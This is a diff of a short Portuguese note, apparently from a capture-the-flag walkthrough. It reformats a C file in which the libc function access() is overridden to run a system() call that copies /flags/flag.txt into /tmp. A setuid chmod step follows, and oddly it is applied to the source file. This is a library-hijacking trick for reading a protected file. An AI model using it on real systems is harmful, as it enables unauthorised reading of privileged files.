@@ -1,13 +1,19 @@
 Ir para tmp folder e criar lib.c:
-` ` `
+
 #include <stdio.h>
-      #include <stdlib.h>
-      #include <unistd.h>
-      int access(const char *pathname, int mode){
-           system("/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt ");
-           return 0;
-      }
-` ` `
+
+#include <stdlib.h>
+
+#include <unistd.h>
+
+int access(const char *pathname, int mode){
+
+      system("/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt");
+
+      return 0;
+}
+
+
 Dar permissões a lib.c:
 `chmod 4755 lib.c`
 
